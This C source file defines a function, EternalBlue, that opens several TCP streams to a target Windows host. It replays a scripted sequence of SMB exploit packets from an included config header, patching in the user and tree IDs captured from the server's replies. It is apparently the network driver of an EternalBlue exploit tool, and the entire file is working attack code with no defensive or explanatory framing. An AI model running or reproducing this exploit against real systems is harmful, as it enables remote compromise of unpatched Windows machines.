#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

int EternalBlue(const char *ip, int port)
{
    SOCKET sockets[NUM_SOCKETS + 1];
    struct sockaddr_in address;
    uint8_t userid[2] = {0, 0};
    uint8_t treeid[2] = {0, 0};
    WSADATA wsa_data;
    size_t i;
    size_t stream;
    int result = -1;
    int wsa_started = 0;

    for (i = 0; i <= (size_t)NUM_SOCKETS; ++i)
        sockets[i] = INVALID_SOCKET;

    if (ip == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return -1;
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;

    printf("EternalBlue: replaying %zu operations against %s:%d\n",
           (size_t)EB_OPS_COUNT, ip, port);

    for (i = 0; i < (size_t)EB_OPS_COUNT; ++i) {
        const eb_op_t *op = &EB_OPS[i];
        SOCKET sock;

        stream = (size_t)op->stream;
        if (stream == 0 || stream > (size_t)NUM_SOCKETS) {
            printf("EternalBlue: invalid stream at operation %zu\n", i);
            goto cleanup;
        }
        sock = sockets[stream];

        switch (op->kind) {
        case 0:
            if (sock != INVALID_SOCKET) {
                printf("EternalBlue: stream %zu is already connected\n", stream);
                goto cleanup;
            }
            printf("EternalBlue: operation %zu connecting stream %zu\n", i, stream);
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET)
                goto cleanup;
            sockets[stream] = sock;
            if (connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
                goto cleanup;
            break;

        case 1: {
            size_t source_offset = (size_t)op->offset;
            size_t source_length = (size_t)op->length;
            size_t position = 0;
            size_t output_length = 0;
            uint8_t *buffer;

            if (sock == INVALID_SOCKET ||
                source_offset > sizeof(EB_PACKETS) ||
                source_length > sizeof(EB_PACKETS) - source_offset) {
                printf("EternalBlue: invalid send operation %zu\n", i);
                goto cleanup;
            }

            buffer = (uint8_t *)malloc(source_length != 0 ? source_length : 1);
            if (buffer == NULL)
                goto cleanup;

            while (position < source_length) {
                const uint8_t *source = EB_PACKETS + source_offset + position;

                if (source_length - position >= sizeof("__USERID__PLACEHOLDER__") - 1 &&
                    memcmp(source, "__USERID__PLACEHOLDER__",
                           sizeof("__USERID__PLACEHOLDER__") - 1) == 0) {
                    memcpy(buffer + output_length, userid, sizeof(userid));
                    output_length += sizeof(userid);
                    position += sizeof("__USERID__PLACEHOLDER__") - 1;
                } else if (source_length - position >= sizeof("__TREEID__PLACEHOLDER__") - 1 &&
                           memcmp(source, "__TREEID__PLACEHOLDER__",
                                  sizeof("__TREEID__PLACEHOLDER__") - 1) == 0) {
                    memcpy(buffer + output_length, treeid, sizeof(treeid));
                    output_length += sizeof(treeid);
                    position += sizeof("__TREEID__PLACEHOLDER__") - 1;
                } else {
                    buffer[output_length++] = *source;
                    ++position;
                }
            }

            printf("EternalBlue: operation %zu sending %zu bytes on stream %zu\n",
                   i, output_length, stream);
            {
                size_t sent_total = 0;
                while (sent_total < output_length) {
                    size_t remaining = output_length - sent_total;
                    int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                    int sent = send(sock, (const char *)buffer + sent_total, chunk, 0);
                    if (sent == SOCKET_ERROR || sent == 0) {
                        free(buffer);
                        goto cleanup;
                    }
                    sent_total += (size_t)sent;
                }
            }
            free(buffer);
            break;
        }

        case 2: {
            uint8_t response[4096];
            int received;

            if (sock == INVALID_SOCKET) {
                printf("EternalBlue: invalid receive operation %zu\n", i);
                goto cleanup;
            }
            printf("EternalBlue: operation %zu receiving on stream %zu\n", i, stream);
            received = recv(sock, (char *)response, (int)sizeof(response), 0);
            if (received == SOCKET_ERROR || received == 0)
                goto cleanup;

            if (op->fix == 1 && received >= 34) {
                userid[0] = response[32];
                userid[1] = response[33];
            } else if (op->fix == 2 && received >= 30) {
                treeid[0] = response[28];
                treeid[1] = response[29];
            }
            break;
        }

        case 3:
            if (sock == INVALID_SOCKET) {
                printf("EternalBlue: invalid close operation %zu\n", i);
                goto cleanup;
            }
            printf("EternalBlue: operation %zu closing stream %zu\n", i, stream);
            sockets[stream] = INVALID_SOCKET;
            if (closesocket(sock) == SOCKET_ERROR)
                goto cleanup;
            break;

        default:
            printf("EternalBlue: invalid operation kind at operation %zu\n", i);
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    for (i = 1; i <= (size_t)NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET) {
            closesocket(sockets[i]);
            sockets[i] = INVALID_SOCKET;
        }
    }
    if (wsa_started)
        WSACleanup();
    return result;
}